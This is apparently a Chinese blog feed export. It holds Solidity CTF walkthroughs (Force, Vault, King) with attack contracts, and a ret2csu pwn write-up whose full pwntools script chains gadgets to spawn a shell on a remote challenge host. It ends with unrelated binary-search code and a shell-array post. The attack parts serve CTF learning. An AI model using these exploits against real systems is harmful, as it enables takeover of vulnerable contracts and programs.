<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.owner()</span><br></pre></td></tr></table></figure>

<p>如果是你的地址，则说明成功了。</p>
<h2 id="Force"><a href="#Force" class="headerlink" title="Force"></a>Force</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Force &#123;&#x2F;*</span><br><span class="line"></span><br><span class="line">                   MEOW ?</span><br><span class="line">         &#x2F;\_&#x2F;\   &#x2F;</span><br><span class="line">    ____&#x2F; o o \</span><br><span class="line">  &#x2F;~____  &#x3D;ø&#x3D; &#x2F;</span><br><span class="line"> (______)__m_m)</span><br><span class="line"></span><br><span class="line">*&#x2F;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：将合约的余额提升至大于0.</p>
<p><img src="https://cdn.yalexin.top/v2-7e6e4f830bc320cded2e3972596be27a_r.jpg" alt></p>
<p>去网上看了看别人的做法，才知道是使用<code>selfdestruct</code>函数</p>
<blockquote>
<p><code>selfdestruct</code>由以太坊智能合约提供，用于销毁区块链上的合约系统。当合约执行自毁操作时，合约账户上剩余的以太币会发送给指定的目标，然后其存储和代码从状态中被移除。然而，自毁函数也是一把双刃剑，一方面它可以使开发人员能够从以太坊中删除智能合约并在紧急情况下转移以太币。另一方面自毁函数也可能成为攻击者的利用工具，攻击者可以利用该函数向目标合约“<strong>强制转账</strong>”，此时并不会触发目标合约的fallback函数，因此不需要该合约有任何的<code>payable</code>函数，从而影响目标合约的正常功能</p>
</blockquote>
<p>因此我们借助一个合约：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract ForceAttack &#123;</span><br><span class="line">    function attack(address _addr) payable public &#123;</span><br><span class="line">        selfdestruct(payable(_addr));</span><br><span class="line">    &#125;</span><br><span class="line">    fallback()payable external&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>部署后，先往该攻击合约中转入少许以太币，然后再调用<code>attack</code>函数即可。</p>
<h2 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">  bool public locked;</span><br><span class="line">  bytes32 private password;</span><br><span class="line"></span><br><span class="line">  constructor(bytes32 _password) &#123;</span><br><span class="line">    locked &#x3D; true;</span><br><span class="line">    password &#x3D; _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function unlock(bytes32 _password) public &#123;</span><br><span class="line">    if (password &#x3D;&#x3D; _password) &#123;</span><br><span class="line">      locked &#x3D; false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：将变量<code>locked</code>改为<code>false</code>.</p>
<p>看上去<code>password</code>是私有的，我们无法查看，但是这里有点“<strong>此地无银三百两</strong>”的味道在里边。</p>
<p>private 定义的函数和状态变量只对定义它的合约可见，该合约派生的合约都不能调用和访问该函数及状态变量。</p>
<p>在合约之外，我们仍然可以获取该变量的值，因为智能合约最终都会写进链上，包括<code>storage</code>，而变量属于<code>storage</code>。</p>
<p>我们参考<code>web3.js</code><a href="https://learnblockchain.cn/docs/web3.js/web3-eth.html?highlight=getstorageat#getstorageat" target="_blank" rel="noopener">【文档】</a>,使用<strong>getStorageAt</strong>函数读取指定内存：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">web3.eth.getStorageAt(address, position [, defaultBlock] [, callback])</span><br></pre></td></tr></table></figure>

<p><strong>参数</strong></p>
<ol>
<li><code>String</code> - 用来获取存储值的地址。</li>
<li><code>Number|String|BN|BigNumber</code> - 存储的索引位置。</li>
<li><code>Number|String|BN|BigNumber</code> - (可选) 如果传入值则会覆盖通过 <a href="https://learnblockchain.cn/docs/web3.js/web3-eth.html?highlight=getstorageat#eth-defaultblock" target="_blank" rel="noopener">web3.eth.defaultBlock</a> 设置的默认区块号。预定义的区块号可以使用 <code>&quot;latest&quot;</code>, <code>&quot;earliest&quot;</code> <code>&quot;pending&quot;</code>, 和 <code>&quot;genesis&quot;</code> 等值。</li>
<li><code>Function</code> - (可选) 可选的回调函数，其第一个参数为错误对象，第二个参数为函数运行结果。</li>
</ol>
<p>我们可以在控制台输入：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.eth.getStorageAt(<span class="string">"0x743e4DdB7A7415D8B4B91b6943AdD4749fa6bd27"</span>, <span class="string">"1"</span>)</span><br></pre></td></tr></table></figure>

<p>其中前面第一个参数是合约的地址，调用<code>contract</code>可以获取。后面的参数是偏移量。</p>
<p>返回了<code>0x412076657279207374726f6e67207365637265742070617373776f7264203a29</code>，实际上就是<code>password</code>变量。</p>
<p>我们将其作为参数，调用<code>unlock</code>函数即可。</p>
<p>实际上，我们将该密码解码，是一个字符串<code>A very strong secret password :)</code></p>
<h2 id="King"><a href="#King" class="headerlink" title="King"></a>King</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract King &#123;</span><br><span class="line"></span><br><span class="line">  address king;</span><br><span class="line">  uint public prize;</span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() payable &#123;</span><br><span class="line">    owner &#x3D; msg.sender;  </span><br><span class="line">    king &#x3D; msg.sender;</span><br><span class="line">    prize &#x3D; msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt;&#x3D; prize || msg.sender &#x3D;&#x3D; owner);</span><br><span class="line">    payable(king).transfer(msg.value);</span><br><span class="line">    king &#x3D; msg.sender;</span><br><span class="line">    prize &#x3D; msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function _king() public view returns (address) &#123;</span><br><span class="line">    return king;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>本关卡类似一个庞氏骗局，即任何人只要往该合约充值的钱数A大于上一任国王的钱数B，那他将会变成新的国王，同时旧国王将会得到数量为A的钱。</p>
</blockquote>
<p><strong>通关条件</strong>：提交实例后，系统将会尝试将王权拿走，你要阻止这一过程，即合约王权不会被更改（<strong>别想着往里边充值大量以太币，这个办法行不通</strong>）。</p>
<p>本关卡利用点是<code>transfer</code>。即我们获取王权后，尝试<strong>拒绝系统的转账</strong>。</p>
<p>智能合约中，有三种方式进行转账，分别是：</p>
<p><strong><code>send</code></strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;address payable&gt;.send(uint256 amount) returns (bool)</span><br></pre></td></tr></table></figure>

<p>向<code>address</code>转入<code>amount</code>，如果异常会转账失败，仅会返回false，不会终止执行（合约地址转账）,有gas限制，最大2300</p>
<p><strong><code>transfer</code></strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;address payable&gt;.transfer(uint256 amount)</span><br></pre></td></tr></table></figure>

<p>如果异常会转账失败，抛出异常(等价于requi(send()))（合约地址转账），有gas限制，最大2300。</p>
<p><strong><code>call</code></strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;address&gt;.call(bytes memory) returns (bool, bytes memory)</span><br></pre></td></tr></table></figure>

<p>如果异常会转账失败，仅会返回false，不会终止执行（调用合约的方法并转账）,没有gas限制.</p>
<p>从上面可以看出，当<code>transfer</code>出现异常时候，第19、20行就不被执行，即我们应该尝试触发一个异常，借助下面的合约，我们即可完成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract KingAttack &#123;</span><br><span class="line"></span><br><span class="line">  	constructor(address payable  contract_addr) payable &#123;</span><br><span class="line">          contract_addr.call&#123;value:0.001 ether&#125;(&quot;&quot;);</span><br><span class="line">  	&#125;</span><br><span class="line">    fallback()payable external&#123;</span><br><span class="line">    &#x2F;&#x2F; 触发异常，阻止King合约的19、20行的执行</span><br><span class="line">    	revert();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们要先将我们的<code>KingAttack</code>合约部署，部署的时候同时转入<code>0.001 ether</code>(因为King合约中的<code>prize</code>为<code>0.001ether</code>)。部署完毕后，输入<code>await contract._king()</code>，如果返回的是我们<code>KingAttack</code>的地址，则说明我们获得了王权，此时直接提交实例即可。</p>
]]></content>
      <categories>
        <category>网络攻防</category>
      </categories>
      <tags>
        <tag>Solidity</tag>
        <tag>Web3.0</tag>
      </tags>
  </entry>
  <entry>
    <title>初识ret2csu</title>
    <url>/2022/10/16/pwn%E8%8E%B7%E5%8F%96shell%E6%96%B9%E5%BC%8F%E4%B9%8B%E4%B8%80%E2%80%94%E2%80%94syscall/</url>
    <content><![CDATA[<p>在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的 <code>gadgets</code>，换句话说，我们不能够通过<code>pop</code>的方式直接修改所需要的寄存器， 这时候，我们可以利用 <code>x64</code> 下的<code>__libc_csu_init</code>中的 <code>gadgets</code>。这个函数是用来对<code>libc</code> 进行初始化操作的，在这里边，会对很多寄存器初始化，而一般的程序都会调用 <code>libc</code> 函数，所以这个函数一定会存在。</p>
<p>我们以一道题目为例：<a href="https://buuoj.cn/challenges#ciscn_2019_s_3" target="_blank" rel="noopener">【ciscn_2019_s_3】</a></p>
<a id="more"></a>

<h2 id="获取题目基础信息"><a href="#获取题目基础信息" class="headerlink" title="获取题目基础信息"></a>获取题目基础信息</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> file ciscn_s_3</span></span><br><span class="line">ciscn_s_3: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=af580816080db5e4d1d93a271087adaee29028e8, not stripped</span><br></pre></td></tr></table></figure>

<p>64位小端程序，很常规</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols      FORTIFY  Fortified       Fortifiable     FILE</span><br><span class="line">Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   68 Symbols     No     0</span><br></pre></td></tr></table></figure>

<p>没有<code>canary</code>，说明如果有栈溢出漏洞，则我们可以利用，另外<code>NX</code>也开启了，说明栈上不可执行。常规得不能再常规了。</p>
<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>使用IDA分析，重要函数<code>vuln</code>如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">xor     rax, rax</span><br><span class="line">mov     edx, 400h       ; count</span><br><span class="line">lea     rsi, [rsp+buf]  ; buf</span><br><span class="line">mov     rdi, rax        ; fd</span><br><span class="line">syscall                 ; LINUX - sys_read</span><br><span class="line">mov     rax, 1</span><br><span class="line">mov     edx, 30h        ; count</span><br><span class="line">lea     rsi, [rsp+buf]  ; buf</span><br><span class="line">mov     rdi, rax        ; fd</span><br><span class="line">syscall                 ; LINUX - sys_write</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>

<p>实际上就是通过系统调用的方式调用了<code>read()</code>和<code>write()</code>函数，具体为最多写进<code>0x400h</code>个数据，然后再输出从<code>buf</code>开始的位置的<code>0x30h</code>个数据。</p>
<p>而我们的<code>buf</code>长度为<code>0x10</code>，也就是说我们可以利用栈溢出漏洞干点事情。</p>
<p>在此之前，我们先看看系统调用的一些知识。</p>
<h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h3><p>32位和64位系统调用有一些区别，具体为：</p>
<p>32位与64位 系统调用的区别：</p>
<ol>
<li><p>传参方式不同</p>
</li>
<li><p>系统调用号不同</p>
</li>
<li><p>调用方式 不同</p>
</li>
</ol>
<table>
<thead>
<tr>
<th></th>
<th>32位</th>
<th>64位</th>
</tr>
</thead>
<tbody><tr>
<td>传参方式</td>
<td>先将系统调用号传入 eax，然后将参数从左到右依次存入 ebx，ecx，edx寄存器中，返回值存在eax寄存器</td>
<td>首先将系统调用号 传入 rax，然后将参数 从左到右 依次存入 rdi，rsi，rdx寄存器中，返回值存在rax寄存器</td>
</tr>
<tr>
<td>常见系统调用号</td>
<td>sys_read 的调用号 为 3<br>sys_write 的调用号 为 4</td>
<td>sys_read 的调用号 为 0<br>sys_write 的调用号 为 1<br>stub_execve 的调用号 为 59<br>stub_rt_sigreturn 的调用号 为 15</td>
</tr>
<tr>
<td>调用方式</td>
<td>使用 int 80h 中断进行系统调用</td>
<td>使用 syscall 指令进行系统调用</td>
</tr>
</tbody></table>
<blockquote>
<p>其他系统调用号可以参照文件<code>/usr/include/asm/unistd.h</code></p>
</blockquote>
<h2 id="溢出漏洞利用"><a href="#溢出漏洞利用" class="headerlink" title="溢出漏洞利用"></a>溢出漏洞利用</h2><p>确定其能够溢出以后，我们可以尝试利用溢出，控制程序的走向，即构造<code>execv(&#39;/bin/sh&#39;,0,0)</code>，再通过<code>syscall</code>执行<code>execv</code>，从而获取<code>shell</code>，栈大致布局如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rax&#x3D;59</span><br><span class="line">rdi&#x3D;&#39;&#x2F;bin&#x2F;sh&#39;</span><br><span class="line">rsi&#x3D;0</span><br><span class="line">rdx&#x3D;0</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>

<p>但是我们并没有上述连续的片段可以利用，只能借助几个片段来进行。</p>
<p>同时我们还要获取<code>&#39;/bin/sh&#39;</code>的地址，可是我们在<code>IDA</code>中，并没有发现此字符串，也就是说要我们手动构造，构造倒也不是难事，主要是如何找到该字符串地址？</p>
<p>我们在此回顾之前的<code>vuln</code>函数，我们会发现，该函数中会出输出从<code>buf</code>开始的<code>0x30h</code>的数据，而刚刚进入该函数的时候，栈内的大致布局如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 低地址</span><br><span class="line">buf </span><br><span class="line">...</span><br><span class="line">buf</span><br><span class="line">main_rbp</span><br><span class="line">main_retn_addr</span><br><span class="line">main&#39;s father function rbp</span><br><span class="line">main&#39;s father function retn_addr</span><br><span class="line">....</span><br><span class="line"># 高地址</span><br></pre></td></tr></table></figure>

<p>虽然栈地址每次都会改变，但是进入函数后，<code>buf</code>的地址和<code>main_retn_addr</code>之间的偏移是不变的，因此我们可以借助<code>write</code>函数泄露的地址来确定<code>buf</code>的地址，进一步地，如果我们在<code>buf</code>中写入<code>&#39;/bin/sh&#39;</code>,那该字符串的地址我们也就得到了。</p>
<p>获取到地址后，我们要继续回到<code>vuln</code>函数中，继续利用栈溢出漏洞，即构造<code>execv</code>的执行。</p>
<p>值得注意的是，在<code>vuln</code>函数中，并没有恢复栈平衡，在<code>buf</code>下面直接是返回地址，因为程序中，==在<code>retn</code>指令之前并没有<code>leave</code>指令==.</p>
<p>下一步，我们再动态调试，看一下之前说的偏移是多少，我们先运行到第一个系统调用之前：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">──────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────</span><br><span class="line">   0x4004ee &lt;vuln+1&gt;     mov    rbp, rsp</span><br><span class="line">   0x4004f1 &lt;vuln+4&gt;     xor    rax, rax</span><br><span class="line">   0x4004f4 &lt;vuln+7&gt;     mov    edx, 0x400</span><br><span class="line">   0x4004f9 &lt;vuln+12&gt;    lea    rsi, [rsp - 0x10]</span><br><span class="line">   0x4004fe &lt;vuln+17&gt;    mov    rdi, rax</span><br><span class="line"> ► 0x400501 &lt;vuln+20&gt;    syscall  &lt;SYS_read&gt;</span><br><span class="line">        fd: 0x0 (&#x2F;dev&#x2F;pts&#x2F;0)</span><br><span class="line">        buf: 0x7fffffffde60 ◂— 0x0</span><br><span class="line">        nbytes: 0x400</span><br><span class="line">   0x400503 &lt;vuln+22&gt;    mov    rax, 1</span><br><span class="line">   0x40050a &lt;vuln+29&gt;    mov    edx, 0x30</span><br><span class="line">   0x40050f &lt;vuln+34&gt;    lea    rsi, [rsp - 0x10]</span><br><span class="line">   0x400514 &lt;vuln+39&gt;    mov    rdi, rax</span><br><span class="line">   0x400517 &lt;vuln+42&gt;    syscall </span><br><span class="line">──────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────</span><br><span class="line">00:0000│ rbp rsp 0x7fffffffde70 —▸ 0x7fffffffde90 ◂— 0x1</span><br><span class="line">01:0008│         0x7fffffffde78 —▸ 0x400536 (main+25) ◂— nop    </span><br><span class="line">02:0010│         0x7fffffffde80 —▸ 0x7fffffffdfa8 —▸ 0x7fffffffe2f8 ◂— &#39;&#x2F;home&#x2F;kali&#x2F;Desktop&#x2F;my_share&#x2F;chanllenge&#x2F;ciscn_2019_s_3&#x2F;ciscn_s_3&#39;</span><br><span class="line">03:0018│         0x7fffffffde88 ◂— 0x100000000</span><br></pre></td></tr></table></figure>

<p>我们可以看到当前栈底指针为<code>rbp=0x7fffffffde70</code>，我们发现在主函数中，调用vuln的下一行代码的地址是<code>0x400536</code>，并不是以<code>0x7f</code>开头的，不方便计算偏移，因此我们使用<code>0x7fffffffde80</code>指向的内存中的内容<code>0x7fffffffdfa8</code>计算偏移地址，然后继续运行，输入<code>aaaabbba</code>，然后查找该字符串：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; search aaaabbba</span><br><span class="line">Searching for value: &#39;aaaabbba&#39;</span><br><span class="line">[stack]         0x7fffffffde60 &#39;aaaabbba\n&#39;</span><br></pre></td></tr></table></figure>

<p>有<code>0x7fffffffdfa8-0x7fffffffde60=0x148</code></p>
<p>因此获取的字符串地址的代码为：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">vuln_addr = <span class="number">0x0004004ED</span></span><br><span class="line">payload = flat([<span class="string">b'/bin/sh\0'</span> * <span class="number">2</span>, vuln_addr])</span><br><span class="line"></span><br><span class="line">hacker.sendline(payload)</span><br><span class="line"></span><br><span class="line">hacker.recv(<span class="number">0x20</span>)</span><br><span class="line">rbp = u64(hacker.recv(<span class="number">8</span>))</span><br><span class="line">bin_sh_addr = rbp - <span class="number">0x148</span></span><br></pre></td></tr></table></figure>

<p>找到了字符串后，我们再来回顾一下要做的事情</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rax ← 59</span><br><span class="line">rdi ← &#x2F;bin&#x2F;sh</span><br><span class="line">rsi ← 0</span><br><span class="line">rdx ← 0</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong>1-4行的顺序可变，只要保证执行<code>syscall</code>的时候，其对应的寄存器中的值是上述描述的即可。</p>
<p>通过下面的两个命令，我们可以得到控制上述的指令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ROPgadget --binary ciscn_s_3  --only <span class="string">'pop|ret'</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ROPgadget --binary ciscn_s_3  --only <span class="string">'mov|ret'</span></span></span><br></pre></td></tr></table></figure>

<p>然后我们却无法找到直接修改<code>rdx</code>的地方。</p>
<p>然后，我们可以通过使用下面的命令查找修改该寄存器的地方：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> objdump ciscn_s_3 --disassemble  -M intel | grep rdx</span></span><br><span class="line">400580: mov    rdx,r13</span><br></pre></td></tr></table></figure>

<p>继续使用命令观察<code>0x400580</code>后面的指令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400580: mov    rdx,r13</span><br><span class="line">400583: mov    rsi,r14</span><br><span class="line">400586: mov    edi,r15d</span><br><span class="line">400589: call   QWORD PTR [r12+rbx*8]</span><br></pre></td></tr></table></figure>

<p>可以看到还是能修改完，然后跳转的！只要在这里边将<code>r12</code>设置为返回的地址，<code>rbx</code>设置为0。</p>
<p>最终利用链如下图：</p>
<p><img src="https://cdn.yalexin.top/ROPgadget.png" alt="ROPgadget"></p>
<p>前两个<code>gadgets</code>就是利用了<code>ret2csu</code>的思想。</p>
<p>值得注意的是，call最终实际调用的地方是<code>[[r12+rbx*8]]</code>，假如说，我们的<code>mov rax, 0x3b</code>的地址是<code>7</code>,然后我们将该地址写入到栈上地址为<code>3</code>的地方，则我们的<code>r12+rbx*8</code>的值为<code>3</code>,即</p>
<p><img src="https://cdn.yalexin.top/call.drawio.png" alt="call.drawio"></p>
<p>第二次溢出利用代码为：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b'/bin/sh\0'</span> * <span class="number">2</span></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rbx_rbp_r12_r13_r14_r15_ret_addr)</span><br><span class="line"><span class="comment"># bin_sh_addr + 0x50 是 mov_rax_ret_addr 所在地址</span></span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">2</span> + p64(bin_sh_addr + <span class="number">0x50</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + p64(mov_rdx_rsi_edi_call_addr)</span><br><span class="line">payload += p64(mov_rax_ret_addr) + p64(pop_rdi_ret)+p64(bin_sh_addr) + p64(syscall_addr)</span><br><span class="line"></span><br><span class="line">hacker.sendline(payload)</span><br></pre></td></tr></table></figure>

<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher  <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">'debug'</span>, os = <span class="string">'linux'</span>, arch = <span class="string">'amd64'</span>)</span><br><span class="line">debug = <span class="literal">False</span></span><br><span class="line">hacker = <span class="literal">None</span> </span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    hacker = process(<span class="string">'./ciscn_s_3'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    hacker = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">26674</span>)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x10</span></span><br><span class="line">elf = ELF(<span class="string">'./ciscn_s_3'</span>)</span><br><span class="line"></span><br><span class="line">vuln_addr = <span class="number">0x0004004ED</span></span><br><span class="line">payload = flat([<span class="string">b'/bin/sh\0'</span> * <span class="number">2</span>, vuln_addr])</span><br><span class="line"></span><br><span class="line">hacker.sendline(payload)</span><br><span class="line"></span><br><span class="line">hacker.recv(<span class="number">0x20</span>)</span><br><span class="line">rbp = u64(hacker.recv(<span class="number">8</span>))</span><br><span class="line">bin_sh_addr = rbp - <span class="number">0x118</span></span><br><span class="line"><span class="comment"># bin_sh_addr = rbp - 0x148</span></span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15_ret_addr = <span class="number">0x40059A</span></span><br><span class="line">mov_rdx_rsi_edi_call_addr = <span class="number">0x400580</span></span><br><span class="line">mov_rax_ret_addr = <span class="number">0x4004e2</span></span><br><span class="line">pop_rsi_r15_ret_addr = <span class="number">0x4005a1</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4005a3</span></span><br><span class="line">syscall_addr = <span class="number">0x400517</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'/bin/sh\0'</span> * <span class="number">2</span></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rbx_rbp_r12_r13_r14_r15_ret_addr)</span><br><span class="line"><span class="comment"># bin_sh_addr + 0x50 是 mov_rax_ret_addr 所在地址</span></span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">2</span> + p64(bin_sh_addr + <span class="number">0x50</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + p64(mov_rdx_rsi_edi_call_addr)</span><br><span class="line">payload += p64(mov_rax_ret_addr) + p64(pop_rdi_ret)+p64(bin_sh_addr) + p64(syscall_addr)</span><br><span class="line"></span><br><span class="line">hacker.sendline(payload)</span><br><span class="line">hacker.interactive()</span><br></pre></td></tr></table></figure>

<p><strong>然而本题中，官方提供的程序和实际远程运行的不一致，使得之前说的偏移量并不是<code>0x148</code>.</strong></p>
]]></content>
  </entry>
  <entry>
    <title>二分查找</title>
    <url>/2020/08/24/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/</url>
    <content><![CDATA[<p>二分查找应用于在有序数组中寻找满足特定条件的元素，时间复杂度可以降到<code>O(logn)</code>，该算法的必要前提是有序数组必须有序。<a id="more"></a></p>
<h2 id="查找不小于target元素的下标"><a href="#查找不小于target元素的下标" class="headerlink" title="查找不小于target元素的下标"></a>查找不小于target元素的下标</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lower_bound</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> start, <span class="keyword">int</span> end, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mid = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (start &lt; end) &#123;</span><br><span class="line">        mid = (start + end) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (target &gt; nums[mid]) &#123;</span><br><span class="line">            start = mid + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            end = mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (nums[end] &lt; target) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> end;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="查找大于target元素的下标"><a href="#查找大于target元素的下标" class="headerlink" title="查找大于target元素的下标"></a>查找大于target元素的下标</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">upper_bound</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> start, <span class="keyword">int</span> end, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mid = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (start &lt; end) &#123;</span><br><span class="line">        mid = (start + end) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (target &gt;= nums[mid]) &#123;</span><br><span class="line">            start = mid + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            end = mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (nums[end] &lt; target) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> end;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="查找第一个target元素的下标"><a href="#查找第一个target元素的下标" class="headerlink" title="查找第一个target元素的下标"></a>查找第一个target元素的下标</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">exist_bound</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> start, <span class="keyword">int</span> end, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mid = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (start &lt; end) &#123;</span><br><span class="line">        mid = (start + end) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (target &gt; nums[mid]) &#123;</span><br><span class="line">            start = mid + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (target &lt; nums[mid]) &#123;</span><br><span class="line">            end = mid - <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (mid - <span class="number">1</span> &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[mid - <span class="number">1</span>] == target) &#123;</span><br><span class="line">                end = mid - <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (end &lt; <span class="number">0</span> || nums[end] != target) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> end;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>二分查找</tag>
      </tags>
  </entry>
  <entry>
    <title>shell使用数组</title>
    <url>/2020/04/19/shell%E4%BD%BF%E7%94%A8%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<h2 id="定义数组"><a href="#定义数组" class="headerlink" title="定义数组"></a>定义数组</h2><p>使用括号定义数组，定义的时候可以用元素进行初始化，也可以直接定义：</p>
